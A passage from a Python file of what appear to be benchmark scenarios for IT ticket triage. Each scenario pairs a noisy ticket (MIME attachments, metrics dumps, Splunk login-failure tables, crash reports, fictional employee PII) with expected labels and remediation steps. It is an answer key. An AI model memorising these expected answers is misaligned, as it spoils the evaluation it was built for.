                "ZW4gdHJ5aW5nIHRvIHJlc2V0IG15IHBhc3N3b3JkPC9wPjwvYm9keT48L2h0\n"
                "bWw+\n\n"
                "------=_Part_NESTED_001--\n\n"
                "------=_Part_12345_98765432.1234567890123\n"
                "Content-Type: application/octet-stream;\n"
                '\tname="debug_token_trace.log"\n'
                "Content-Transfer-Encoding: base64\n"
                "Content-Disposition: attachment;\n"
                '\tfilename="debug_token_trace.log"\n\n'
                "VG9rZW4gdmFsaWRhdGlvbiB0cmFjZToKMjAyNi0wMy0xOFQwOToxMjozNFoK\n"
                "RVJSPSAweDRGMjEKU2Vzc2lvbjogYWJjMTIzNDU2Nzg5\n\n"
                "------=_Part_12345_98765432.1234567890123--\n"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD],
            next_best_action=(
                "Extract the password reset failure details from the MIME-garbled "
                "email and investigate the token validation error ERR_AUTH_0x4F21 "
                "on the identity portal."
            ),
            remediation_steps=[
                "Parse through the MIME multipart encoding to extract the plain-text issue.",
                "Investigate ERR_AUTH_0x4F21 in the identity provider logs for j.nakamura.",
                "Check if the SSPR token service is functioning correctly.",
                "Verify the user's MFA registration and Authenticator app configuration.",
                "Manually reset the password and confirm the user can log in.",
            ],
            reporter_name="Jun Nakamura",
            reporter_email="j.nakamura@contoso.com",
            reporter_department="Risk Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "mime-garbled", "multipart-boundary"],
            difficulty="hard",
        ),
        # ── DC-209  Prometheus / Grafana metrics flood ────────────────────
        ScenarioDefinition(
            scenario_id="DC-209",
            subject="Database response times degraded — Grafana alert pasted",
            description=(
                "Hi Data Platform team,\n\n"
                "Our production PostgreSQL cluster (pg-prod-east-01) is showing "
                "degraded response times since 06:00 UTC today. Here are the "
                "Prometheus metrics from our Grafana dashboard:\n\n"
                "# HELP pg_stat_activity_count Number of active connections\n"
                "# TYPE pg_stat_activity_count gauge\n"
                'pg_stat_activity_count{datname="contoso_trades",state="active"} 247\n'
                'pg_stat_activity_count{datname="contoso_trades",state="idle"} 1893\n'
                'pg_stat_activity_count{datname="contoso_trades",state="idle in transaction"} 42\n'
                'pg_stat_activity_count{datname="contoso_risk",state="active"} 89\n'
                'pg_stat_activity_count{datname="contoso_risk",state="idle"} 456\n\n'
                "# HELP pg_stat_database_blks_hit Disk blocks hit in buffer cache\n"
                "# TYPE pg_stat_database_blks_hit counter\n"
                'pg_stat_database_blks_hit{datname="contoso_trades"} 9.87654321e+09\n'
                'pg_stat_database_blks_read{datname="contoso_trades"} 4.56789012e+08\n\n'
                "# HELP pg_locks_count Number of locks\n"
                "# TYPE pg_locks_count gauge\n"
                'pg_locks_count{datname="contoso_trades",mode="AccessShareLock"} 1247\n'
                'pg_locks_count{datname="contoso_trades",mode="RowExclusiveLock"} 892\n'
                'pg_locks_count{datname="contoso_trades",mode="ExclusiveLock"} 3\n\n'
                "# HELP node_cpu_seconds_total CPU usage\n"
                "# TYPE node_cpu_seconds_total counter\n"
                'node_cpu_seconds_total{cpu="0",mode="user"} 345678.90\n'
                'node_cpu_seconds_total{cpu="0",mode="system"} 123456.78\n'
                'node_cpu_seconds_total{cpu="0",mode="iowait"} 98765.43\n'
                'node_cpu_seconds_total{cpu="1",mode="user"} 334567.89\n'
                'node_cpu_seconds_total{cpu="1",mode="iowait"} 87654.32\n\n'
                "The key concern is the high iowait and the 42 connections stuck in "
                "'idle in transaction' state. Average query latency went from 12ms "
                "to 850ms. The nightly ETL job (etl-trade-reconciliation) may be "
                "holding long transactions.\n\n"
                "— Raj Patel, Data Engineering"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.TIMESTAMP, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate the 42 idle-in-transaction connections and high iowait "
                "on pg-prod-east-01, likely caused by the nightly ETL job holding "
                "long transactions."
            ),
            remediation_steps=[
                "Identify the long-running transactions in pg_stat_activity.",
                "Check if etl-trade-reconciliation is holding open transactions.",
                "Terminate stale idle-in-transaction sessions if safe to do so.",
                "Review iowait metrics and check disk I/O saturation on the host.",
                "Tune connection pooling to prevent idle connection buildup.",
            ],
            reporter_name="Raj Patel",
            reporter_email="raj.patel@contoso.com",
            reporter_department="Data Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "prometheus-metrics", "grafana-alerts"],
            difficulty="medium",
        ),
        # ── DC-210  Windows systeminfo dump ───────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-210",
            subject="Laptop overheating — systeminfo output attached",
            description=(
                "My laptop keeps overheating and shutting down. IT asked me to run "
                "systeminfo so here it is:\n\n"
                "Host Name:                 NYC-WS-TCHEN04\n"
                "OS Name:                   Microsoft Windows 11 Enterprise\n"
                "OS Version:                10.0.22631 N/A Build 22631\n"
                "OS Manufacturer:           Microsoft Corporation\n"
                "OS Configuration:          Member Workstation\n"
                "OS Build Type:             Multiprocessor Free\n"
                "Registered Owner:          Tina Chen\n"
                "Registered Organization:   Contoso Financial Services\n"
                "Product ID:                00329-00000-00003-AA123\n"
                "Original Install Date:     8/15/2025, 2:30:00 PM\n"
                "System Boot Time:          3/18/2026, 8:45:12 AM\n"
                "System Manufacturer:       LENOVO\n"
                "System Model:              21HQS1RX00\n"
                "System Type:               x64-based PC\n"
                "Processor(s):              1 Processor(s) Installed.\n"
                "                           [01]: Intel64 Family 6 Model 186 "
                "Stepping 3 GenuineIntel ~2100 Mhz\n"
                "BIOS Version:              LENOVO N3HET94W (1.60 ), 1/15/2026\n"
                "Windows Directory:         C:\\Windows\n"
                "System Directory:          C:\\Windows\\system32\n"
                "Boot Device:               \\Device\\HarddiskVolume1\n"
                "System Locale:             en-us;English (United States)\n"
                "Input Locale:              en-us;English (United States)\n"
                "Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)\n"
                "Total Physical Memory:     32,476 MB\n"
                "Available Physical Memory: 4,231 MB\n"
                "Virtual Memory: Max Size:  37,596 MB\n"
                "Virtual Memory: Available: 8,102 MB\n"
                "Virtual Memory: In Use:    29,494 MB\n"
                "Page File Location(s):     C:\\pagefile.sys\n"
                "Domain:                    contoso.com\n"
                "Logon Server:              \\\\NYC-DC-01\n"
                "Hotfix(s):                 15 Hotfix(s) Installed.\n"
                "                           [01]: KB5034765\n"
                "                           [02]: KB5035853\n"
                "                           [03]: KB5036212\n"
                "                           [04]: KB5037019\n"
                "Network Card(s):           3 NIC(s) Installed.\n"
                "                           [01]: Intel Wi-Fi 6E AX211 160MHz\n"
                "                           [02]: Bluetooth Device\n"
                "                           [03]: Cisco AnyConnect Virtual Adapter\n"
                "Hyper-V Requirements:      VM Monitor Mode Extensions: Yes\n\n"
                "The laptop gets really hot near the fan vent after about 30 minutes "
                "of use. It has shut down twice today during video calls. "
                "Asset tag: LPT-2024-01892.\n"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.REPRODUCTION_FREQUENCY, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate laptop thermal shutdown on ThinkPad 21HQS1RX00 — note "
                "high memory utilization (28GB of 32GB in use) which may indicate "
                "a runaway process contributing to thermal load."
            ),
            remediation_steps=[
                "Check for dust buildup in fan vents and schedule physical cleaning.",
                "Review Task Manager for high-CPU processes consuming resources.",
                "Note available memory is only 4GB of 32GB — identify memory-intensive processes.",
                "Update BIOS firmware if a thermal management fix is available.",
                "Run Lenovo Vantage diagnostics to check fan and thermal sensor health.",
            ],
            reporter_name="Tina Chen",
            reporter_email="tina.chen@contoso.com",
            reporter_department="Wealth Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "systeminfo-dump", "command-output"],
            difficulty="medium",
        ),
        # ── DC-211  Splunk search results paste ───────────────────────────
        ScenarioDefinition(
            scenario_id="DC-211",
            subject="Suspicious login alerts — Splunk results attached",
            description=(
                "Security team,\n\n"
                "We're seeing a spike in failed login attempts against our "
                "production Azure AD. I exported the Splunk results below:\n\n"
                "| _time              | src_ip        | user              | result  |\n"
                "|--------------------+---------------+-------------------+---------|\n"
                "| 2026-03-18 04:12:01| 185.220.101.42| admin@contoso.com | FAILURE |\n"
                "| 2026-03-18 04:12:03| 185.220.101.42| admin@contoso.com | FAILURE |\n"
                "| 2026-03-18 04:12:05| 185.220.101.42| svc-backup@contoso| FAILURE |\n"
                "| 2026-03-18 04:12:07| 185.220.101.42| cfo@contoso.com   | FAILURE |\n"
                "| 2026-03-18 04:12:09| 185.220.101.42| hr.admin@contoso  | FAILURE |\n"
                "| 2026-03-18 04:12:11| 185.220.101.42| it.admin@contoso  | FAILURE |\n"
                "| 2026-03-18 04:12:13| 185.220.101.42| admin@contoso.com | FAILURE |\n"
                "| 2026-03-18 04:12:15| 91.219.236.88 | admin@contoso.com | FAILURE |\n"
                "| 2026-03-18 04:12:17| 91.219.236.88 | root@contoso.com  | FAILURE |\n"
                "| 2026-03-18 04:12:19| 91.219.236.88 | administrator@cto | FAILURE |\n\n"
                "SPL query used: index=azure_ad sourcetype=azure:signin action=login "
                "result=FAILURE | stats count by src_ip, user | where count > 5\n\n"
                "Total: 847 failed attempts from 3 source IPs in the last 2 hours. "
                "All from known Tor exit nodes. No successful logins yet but the "
                "pattern looks like a credential stuffing attack. Please investigate "
                "and consider blocking these IPs at the WAF.\n\n"
                "— Omar Al-Rashid, SOC Analyst"
            ),
            category=Category.SECURITY,
            priority=Priority.P2,
            team=Team.SECURITY_OPS,
            needs_escalation=True,
            missing_info=[MissingInfo.AFFECTED_USERS, MissingInfo.BUSINESS_IMPACT],
            next_best_action=(
                "Investigate potential credential stuffing attack from Tor exit "
                "nodes against Azure AD — 847 failed attempts in 2 hours."
            ),
            remediation_steps=[
                "Block the identified Tor exit node IPs at the WAF and Azure AD conditional access.",
                "Review all targeted accounts for successful logins from suspicious IPs.",
                "Enable Azure AD Smart Lockout if not already configured.",
                "Check if any of the targeted accounts have weak or compromised passwords.",
                "Correlate with threat intelligence feeds for the source IP addresses.",
            ],
            reporter_name="Omar Al-Rashid",
            reporter_email="omar.alrashid@contoso.com",
            reporter_department="Security Operations",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "splunk-results", "siem-output"],
            difficulty="medium",
        ),
        # ── DC-212  ARM / Bicep IaC template dump ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-212",
            subject="Azure deployment failed — ARM template error",
            description=(
                "Hi team,\n\n"
                "Our Azure deployment pipeline failed. Here's the ARM template "
                "that errored out:\n\n"
                "{\n"
                '  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",\n'
                '  "contentVersion": "1.0.0.0",\n'
                '  "parameters": {\n'
                '    "storageAccountName": {\n'
                '      "type": "string",\n'
                '      "metadata": { "description": "Name of the storage account" }\n'
                "    },\n"
                '    "location": {\n'
                '      "type": "string",\n'
                '      "defaultValue": "[resourceGroup().location]"\n'
                "    },\n"
                '    "skuName": {\n'
                '      "type": "string",\n'
                '      "defaultValue": "Standard_LRS",\n'
                '      "allowedValues": ["Standard_LRS","Standard_GRS","Premium_LRS"]\n'
                "    }\n"
                "  },\n"
                '  "resources": [\n'
                "    {\n"
                '      "type": "Microsoft.Storage/storageAccounts",\n'
                '      "apiVersion": "2023-01-01",\n'
                '      "name": "[parameters(\'storageAccountName\')]",\n'
                '      "location": "[parameters(\'location\')]",\n'
                '      "sku": { "name": "[parameters(\'skuName\')]" },\n'
                '      "kind": "StorageV2",\n'
                '      "properties": {\n'
                '        "minimumTlsVersion": "TLS1_2",\n'
                '        "supportsHttpsTrafficOnly": true,\n'
                '        "networkAcls": {\n'
                '          "defaultAction": "Deny",\n'
                '          "virtualNetworkRules": [],\n'
                '          "ipRules": []\n'
                "        }\n"
                "      }\n"
                "    }\n"
                "  ]\n"
                "}\n\n"
                "Error from Azure: 'StorageAccountAlreadyTaken — The storage account "
                "name contosoproddata01 is already taken. Please choose a different name.'\n\n"
                "We need this deployed for the Q2 data migration project by end of week.\n\n"
                "— Fatima Hassan, Cloud Infrastructure"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Resolve the storage account naming conflict — the name 'contosoproddata01' is globally taken in Azure."
            ),
            remediation_steps=[
                "Choose a unique storage account name (Azure storage names are globally unique).",
                "Update the ARM template parameter with the new name.",
                "Verify the deployment pipeline uses the correct resource group and subscription.",
                "Re-run the deployment and confirm the storage account provisions successfully.",
                "Update the data migration documentation with the final resource name.",
            ],
            reporter_name="Fatima Hassan",
            reporter_email="fatima.hassan@contoso.com",
            reporter_department="Cloud Infrastructure",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "arm-bicep-template", "iac-dump"],
            difficulty="medium",
        ),
        # ── DC-213  CSV with hundreds of rows pasted ──────────────────────
        ScenarioDefinition(
            scenario_id="DC-213",
            subject="Data import failing — sample CSV rows included",
            description=(
                "Hi Data Platform,\n\n"
                "The nightly import job (etl-client-onboarding) keeps failing on "
                "the CSV file from the client portal. Here are the first rows that "
                "are causing issues:\n\n"
                "client_id,name,email,department,account_type,balance,status,created\n"
                "C-10001,John Smith,john.smith@example.com,Retail,CHECKING,15432.50,ACTIVE,2025-01-15\n"
                "C-10002,Maria Garcia,m.garcia@example.com,Wealth,SAVINGS,892341.00,ACTIVE,2025-02-20\n"
                "C-10003,Wei Zhang,,Corporate,MONEY_MARKET,2500000.00,ACTIVE,2025-03-01\n"
                "C-10004,Ahmed Hassan,a.hassan@example.com,,CHECKING,7821.33,PENDING,2025-03-10\n"
                "C-10005,Sarah O'Brien,s.obrien@example.com,Retail,CHECKING,0.00,CLOSED,2025-03-11\n"
                "C-10006,Yuki Tanaka,y.tanaka@example.com,Private,INVESTMENT,15000000,ACTIVE,2025-03-12\n"
                "C-10007,,anonymous@example.com,Unknown,CHECKING,-500.00,FROZEN,2025-03-13\n"
                "C-10008,Boris Petrov,b.petrov@example.com,Institutional,CUSTODY,0,ACTIVE,\n"
                "C-10009,Lisa Park,l.park@example.com,Retail,SAVINGS,42.99,ACTIVE,2025-03-14\n"
                "C-10010,NO_NAME_PROVIDED,null,null,null,null,null,null\n"
                "C-10011,Test Account,test@test.com,TEST,TEST,0,TEST,2025-01-01\n"
                "C-10012,Priya Sharma,p.sharma@example.com,Retail,CHECKING,8900.00,ACTIVE,2025-03-15\n"
                "C-10013,James Wilson,j.wilson@example.com,Corporate,CHECKING,125000,ACTIVE,2025-03-15\n"
                "C-10014,Ana Costa,a.costa@example.com,Private,SAVINGS,3400000.00,ACTIVE,2025-03-16\n"
                "C-10015,David Kim,d.kim@example.com,Retail,CHECKING,2100.00,ACTIVE,2025-03-16\n"
                "[... 2,847 more rows omitted ...]\n\n"
                "The ETL job throws: 'ValueError: could not convert string to float: "
                "null' on rows with missing fields. Also row C-10007 has a negative "
                "balance and C-10010 has all nulls. The source system changed its "
                "export format without telling us.\n\n"
                "— Nina Kowalski, Data Operations"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.AFFECTED_SYSTEM],
            next_best_action=(
                "Fix the ETL pipeline to handle null/missing fields in the changed CSV format from the client portal."
            ),
            remediation_steps=[
                "Add null/empty field handling to the CSV parser in the ETL job.",
                "Contact the source system team to get the new export format specification.",
                "Add data validation rules to catch negative balances and test accounts.",
                "Implement a quarantine table for rows that fail validation.",
                "Re-run the import after fixing the parser and review quarantined rows.",
            ],
            reporter_name="Nina Kowalski",
            reporter_email="nina.kowalski@contoso.com",
            reporter_department="Data Operations",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "csv-flood", "bulk-data-paste"],
            difficulty="medium",
        ),
        # ── DC-214  Legacy codepage mojibake ──────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-214",
            subject="Printer showing Ã©trange characters on output",
            description=(
                "Hi IT,\n\n"
                "The printer on Floor 4 (HP LaserJet Pro M428fdw, asset tag "
                "WM-PRN-0891) is printing garbled characters. For example, "
                "when I print a document containing \u00e9, \u00e8, \u00ea, \u00f1, \u00fc it "
                "comes out as Ã©, Ã¨, Ãª, Ã±, Ã¼ on paper.\n\n"
                "The issue affects all documents printed from our CRM application "
                "(Contoso Client Manager v3.8.2). Documents printed from Word or "
                "Excel look fine. I think the CRM is sending CP-1252 encoded text "
                "but the printer driver expects UTF-8.\n\n"
                "Here\u2019s a sample of what prints:\n"
                "  Expected: R\u00e9sum\u00e9 for client Ren\u00e9e Dupr\u00e9\n"
                "  Printed:  R\u00c3\u00a9sum\u00c3\u00a9 for client Ren\u00c3\u00a9e Dupr\u00c3\u00a9\n\n"
                "  Expected: Caf\u00e9 Cr\u00e8me LLC \u2014 M\u00fcnchen Office\n"
                "  Printed:  Caf\u00c3\u00a9 Cr\u00c3\u00a8me LLC \u00e2\u20ac\u201c M\u00c3\u00bcnchen Office\n\n"
                "This started after the printer driver was updated last week.\n\n"
                "Thanks,\nSophie Fontaine\nPrivate Banking"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Fix the character encoding mismatch between the CRM application "
                "(CP-1252) and the updated printer driver (UTF-8)."
            ),
            remediation_steps=[
                "Check the printer driver encoding settings after the recent update.",
                "Verify the CRM application's print output encoding (likely CP-1252).",
                "Configure the printer driver to accept CP-1252 or update the CRM to output UTF-8.",
                "Test printing with special characters after the fix.",
                "Roll back the printer driver if the encoding issue cannot be resolved.",
            ],
            reporter_name="Sophie Fontaine",
            reporter_email="sophie.fontaine@contoso.com",
            reporter_department="Private Banking",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "codepage-mojibake", "encoding-corruption"],
            difficulty="medium",
        ),
        # ── DC-215  Recursive email forward chain (10+ levels) ────────────
        ScenarioDefinition(
            scenario_id="DC-215",
            subject="Fwd: Fwd: Fwd: Fwd: Fwd: Fwd: Fwd: Fwd: Fwd: Fwd: SharePoint access issue",
            description=(
                "---------- Forwarded message ----------\n"
                "From: Lisa Park <l.park@contoso.com>\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Date: Mon, 18 Mar 2026 09:30:00\n"
                "Subject: Fwd: Fwd: Fwd: ... SharePoint access issue\n\n"
                "Forwarding this again, still no resolution.\n\n"
                "---------- Forwarded message ----------\n"
                "From: Mike Chen <m.chen@contoso.com>\n"
                "To: Lisa Park <l.park@contoso.com>\n"
                "Date: Fri, 14 Mar 2026 16:00:00\n\n"
                "Lisa, can you forward this to IT? I don't have the email.\n\n"
                "---------- Forwarded message ----------\n"
                "From: Sarah Kim <s.kim@contoso.com>\n"
                "To: Mike Chen <m.chen@contoso.com>\n"
                "Date: Fri, 14 Mar 2026 15:30:00\n\n"
                "Mike, I'm forwarding David's issue — he still can't access the "
                "Q2 Planning SharePoint site.\n\n"
                "---------- Forwarded message ----------\n"
                "From: David Okonkwo <d.okonkwo@contoso.com>\n"
                "To: Sarah Kim <s.kim@contoso.com>\n"
                "Date: Thu, 13 Mar 2026 11:00:00\n\n"
                "Sarah, I've been locked out of the Q2 Planning SharePoint site "
                "(https://contoso.sharepoint.com/sites/Q2Planning) since Tuesday. "
                "I get 'Error 403: Access Denied — You do not have permission to "
                "access this resource.' I was added to the Contributors group last "
                "month and it was working fine until the site migration on Monday.\n\n"
                "---------- Forwarded message ----------\n"
                "From: David Okonkwo <d.okonkwo@contoso.com>\n"
                "To: Help Desk <helpdesk@contoso.com>\n"
                "Date: Wed, 12 Mar 2026 09:00:00\n\n"
                "Hi, I submitted a ticket about this on Monday but haven't heard back. "
                "Ticket INC-4872.\n\n"
                "---------- Forwarded message ----------\n"
                "From: David Okonkwo <d.okonkwo@contoso.com>\n"
                "To: Team Leads <teamleads@contoso.com>\n"
                "Date: Tue, 11 Mar 2026 14:00:00\n\n"
                "Does anyone else have access to Q2 Planning? I'm completely locked out.\n\n"
                "---------- Forwarded message ----------\n"
                "From: Auto-Reply <noreply@contoso.com>\n"
                "Date: Tue, 11 Mar 2026 09:05:00\n\n"
                "Thank you for contacting IT Support. Your ticket has been logged.\n"
                "Reference: INC-4872. Expected response time: 24 hours.\n\n"
                "---------- Forwarded message ----------\n"
                "From: David Okonkwo <d.okonkwo@contoso.com>\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Date: Mon, 10 Mar 2026 10:00:00\n\n"
                "Hi, I can't access the Q2 Planning SharePoint site after the migration.\n"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.PREVIOUS_TICKET_ID, MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Extract the SharePoint access issue from the deeply nested forward "
                "chain — David Okonkwo lost access to Q2 Planning after a site "
                "migration. Related ticket: INC-4872."
            ),
            remediation_steps=[
                "Locate the original issue in the email chain (David Okonkwo, Q2 Planning SharePoint).",
                "Check SharePoint admin center for David's permissions on the Q2 Planning site.",
                "Verify if the site migration disrupted the Contributors group membership.",
                "Re-add David to the Contributors group if his access was lost during migration.",
                "Link this ticket to the existing INC-4872 for tracking.",
            ],
            reporter_name="Lisa Park",
            reporter_email="l.park@contoso.com",
            reporter_department="Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "recursive-forward", "deep-chain"],
            difficulty="hard",
        ),
        # ── DC-216  PII-heavy content scattered in network issue ──────────
        ScenarioDefinition(
            scenario_id="DC-216",
            subject="Wi-Fi issues in London office — employee details included",
            description=(
                "Hi Network team,\n\n"
                "Multiple employees in the London office (Building 2, Floors 3-5) "
                "are reporting Wi-Fi connectivity issues. I've collected their "
                "details for your investigation:\n\n"
                "Employee: James Wilson\n"
                "  Badge ID: EMP-UK-4521\n"
                "  Phone: +44 20 7946 0321\n"
                "  Mobile: +44 7700 900123\n"
                "  Home: 42 Baker Street, London NW1 6XE\n"
                "  NI Number: AB123456C\n"
                "  Floor: 3, Desk: 3-A-14\n"
                "  Issue: Drops every 15 minutes\n\n"
                "Employee: Amara Obi\n"
                "  Badge ID: EMP-UK-4522\n"
                "  Phone: +44 20 7946 0322\n"
                "  Mobile: +44 7700 900124\n"
                "  Home: 17 Churchill Gardens, London SW1V 3AA\n"
                "  NI Number: CD789012E\n"
                "  Floor: 4, Desk: 4-B-07\n"
                "  Issue: Cannot connect at all\n\n"
                "Employee: Hans Mueller\n"
                "  Badge ID: EMP-UK-4523\n"
                "  Phone: +44 20 7946 0323\n"
                "  Mobile: +44 7700 900125\n"
                "  Home: 8 Kensington Court, London W8 5DL\n"
                "  NI Number: EF345678G\n"
                "  Floor: 5, Desk: 5-C-22\n"
                "  Issue: Slow speeds (< 5 Mbps)\n\n"
                "All three are on the 'CONTOSO-CORP' SSID. The Aruba access points "
                "on these floors were updated last night (firmware 8.10.0.7). The "
                "issues started this morning.\n\n"
                "— Rebecca Thornton, Office Manager London"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate Wi-Fi issues across Floors 3-5 in London Building 2 "
                "following the Aruba AP firmware update to 8.10.0.7. Note: ticket "
                "contains unnecessary PII that should be flagged."
            ),
            remediation_steps=[
                "Check Aruba AP firmware 8.10.0.7 release notes for known Wi-Fi issues.",
                "Review AP controller logs for Floors 3-5 client association failures.",
                "Test Wi-Fi connectivity from each affected floor with a reference device.",
                "Consider rolling back the AP firmware if the update caused the regression.",
                "Flag the excessive PII in this ticket for data handling review.",
            ],
            reporter_name="Rebecca Thornton",
            reporter_email="rebecca.thornton@contoso.com",
            reporter_department="Facilities",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "pii-heavy", "sensitive-data-noise"],
            difficulty="medium",
        ),
        # ── DC-217  Extremely deep JSON nesting ───────────────────────────
        ScenarioDefinition(
            scenario_id="DC-217",
            subject="API returning deeply nested JSON — app crashes parsing it",
            description=(
                "Hi Enterprise Apps,\n\n"
                "Our trade reconciliation app crashes when parsing the response from "
                "the internal pricing API (api-pricing.contoso.internal). The API "
                "started returning deeply nested JSON after last night's deployment. "
                "Here's a sample response:\n\n"
                '{"data":{"result":{"pricing":{"instruments":{"equity":{"sectors":{'
                '"technology":{"companies":{"MSFT":{"quotes":{"realtime":{"bid":{'
                '"amount":{"value":{"raw":{"decimal":{"precision":{"digits":{'
                '"mantissa":{"exponent":{"sign":{"positive":{"flag":true}}}}}}}}}}}}}}}}}}}}}}\n\n'
                "The response has 20+ levels of nesting. Our parser (Jackson in Java) "
                "throws a StackOverflowError when it tries to deserialize this. "
                "The old API response was flat — just {symbol, bid, ask, last, volume}. "
                "Someone on the API team must have changed the response schema without "
                "updating the contract.\n\n"
                "Stack trace (truncated):\n"
                "java.lang.StackOverflowError\n"
                "  at com.fasterxml.jackson.core.JsonParser.nextToken(JsonParser.java:924)\n"
                "  at com.fasterxml.jackson.databind.deser.BeanDeserializer._deserialize...\n"
                "  ... 847 more frames ...\n\n"
                "This is blocking the morning trade reconciliation run.\n\n"
                "— Carlos Mendez, Backend Engineering"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "Investigate the pricing API schema change that introduced deeply "
                "nested JSON responses, causing the trade reconciliation parser to "
                "crash with StackOverflowError."
            ),
            remediation_steps=[
                "Contact the pricing API team about the schema change in last night's deployment.",
                "Revert the API to the previous flat response schema if possible.",
                "If the new schema is intentional, update the trade reconciliation parser.",
                "Increase Jackson parser max nesting depth as a temporary workaround.",
                "Add API contract tests to detect future breaking schema changes.",
            ],
            reporter_name="Carlos Mendez",
            reporter_email="carlos.mendez@contoso.com",
            reporter_department="Backend Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "deep-json-nesting", "api-debug-dump"],
            difficulty="medium",
        ),
        # ── DC-218  macOS crash report in Teams video call ────────────────
        ScenarioDefinition(
            scenario_id="DC-218",
            subject="Teams crashes during video calls — macOS crash report",
            description=(
                "Hi IT,\n\n"
                "Microsoft Teams keeps crashing during video calls on my MacBook Pro. "
                "Here's the crash report from Console.app:\n\n"
                "Process:               Microsoft Teams [12847]\n"
                "Path:                  /Applications/Microsoft Teams.app/Contents/MacOS/Teams\n"
                "Identifier:            com.microsoft.teams2\n"
                "Version:               24072.2406.2783.8184\n"
                "Code Type:             ARM-64 (Native)\n"
                "Parent Process:        launchd [1]\n"
                "Responsible:           Microsoft Teams [12847]\n\n"
                "Date/Time:             2026-03-18 09:15:42.123 -0400\n"
                "OS Version:            macOS 14.4.1 (23E224)\n"
                "Report Version:        12\n"
                "Bridge OS Version:     8.4 (21P4222)\n\n"
                "Exception Type:        EXC_CRASH (SIGABRT)\n"
                "Exception Codes:       0x0000000000000000, 0x0000000000000000\n"
                "Termination Reason:    Namespace SIGNAL, Code 6 Abort trap\n\n"
                "Thread 0 Crashed:\n"
                "0   libsystem_kernel.dylib    0x1a2f3c4d8 __pthread_kill + 8\n"
                "1   libsystem_pthread.dylib   0x1a2f4e5f0 pthread_kill + 256\n"
                "2   libsystem_c.dylib         0x1a2e8d7a4 abort + 124\n"
                "3   Teams                     0x104a2b3c0 CrRendererMain + 1847232\n"
                "4   Teams                     0x104a1c2b0 CrRendererMain + 1785024\n"
                "5   Teams                     0x10498d1a0 CrRendererMain + 1201568\n\n"
                "Thread 1:\n"
                "0   libsystem_kernel.dylib    0x1a2f3b8c0 __workq_kernreturn + 8\n"
                "1   libsystem_pthread.dylib   0x1a2f4d2a0 _pthread_wqthread + 364\n\n"
                "Binary Images:\n"
                "0x1048ac000 - 0x1062abfff Teams (0) <A1B2C3D4-E5F6-7890-AB12-CD34EF56> "
                "/Applications/Microsoft Teams.app/Contents/MacOS/Teams\n\n"
                "The crash happens within 5 minutes of joining any video call with "
                "3+ participants. Audio-only calls work fine. MacBook Pro M3 Pro, "
                "18GB RAM, macOS 14.4.1. Asset tag: LPT-2024-MAC-0247.\n\n"
                "— Yuki Tanaka, Portfolio Management"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.REPRODUCTION_FREQUENCY, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate Teams SIGABRT crash during video calls on macOS 14.4.1 "
                "with M3 Pro — likely a renderer crash related to hardware video "
                "encoding with multiple participants."
            ),
            remediation_steps=[
                "Check for Teams updates addressing macOS 14.4.1 video call crashes.",
                "Disable GPU hardware acceleration in Teams settings as a test.",
                "Verify the macOS version and Teams version are compatible.",
                "Check if the crash correlates with specific video codec usage.",
                "File a bug report with Microsoft if no known fix is available.",
            ],
            reporter_name="Yuki Tanaka",
            reporter_email="yuki.tanaka@contoso.com",
            reporter_department="Portfolio Management",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "macos-reportcrash", "crash-dump"],
            difficulty="medium",
        ),
        # ── DC-219  QR code ASCII art / data URI noise ────────────────────
        ScenarioDefinition(
            scenario_id="DC-219",
            subject="Badge access not working — QR code from door scanner",
            description=(
